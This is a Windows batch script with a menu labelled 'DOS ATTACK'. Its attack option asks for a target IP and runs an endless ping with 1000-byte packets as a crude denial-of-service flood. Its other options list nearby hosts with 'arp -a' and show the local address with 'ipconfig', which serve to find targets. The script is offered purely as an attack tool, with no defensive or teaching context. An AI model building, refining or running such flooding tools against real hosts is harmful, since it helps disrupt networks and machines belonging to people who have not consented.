@echo off 
color 0a 
:start
cls
echo --------------------------
echo     DOS ATTACK 
echo --------------------------
echo.
echo.
echo 1 = Attack
echo 2 = Find ip addresses
echo 3 = Computer I.P
set /p p=Option:-

if %p%==1 goto Attack
if %p%==2 goto Arp
if %p%==3 goto Computer I.P
goto :start

:Attack
cls
color 0a
title Attack
set /p IP=Target I.P:-
ping %IP% -t -l 1000
pause
goto :start

:Arp
cls
color 0a
title Arp
arp -a
pause
goto :start

:Computer I.P
cls
color 0a
title Computer I.P
ipconfig
pause
pause
goto :start

